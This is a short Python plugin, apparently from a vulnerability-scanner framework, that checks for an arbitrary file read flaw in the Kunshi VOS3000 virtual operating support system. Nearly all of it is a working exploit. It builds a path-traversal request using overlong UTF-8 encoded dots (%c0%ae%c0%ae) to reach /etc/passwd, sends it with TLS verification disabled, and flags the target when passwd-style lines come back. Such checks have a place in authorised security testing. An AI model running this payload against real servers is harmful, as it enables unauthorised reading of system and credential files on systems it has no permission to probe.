#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = 'https://peiqi.wgpsec.org/wiki/webapp/昆石网络/昆石网络 VOS3000虚拟运营支撑系统 任意文件读取漏洞.html#昆石网络-vos3000虚拟运营支撑系统-c0-ae-c0-ae-任意文件读取漏洞'
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "昆石网络 VOS3000虚拟运营支撑系统 %c0%ae%c0%ae 任意文件读取漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret  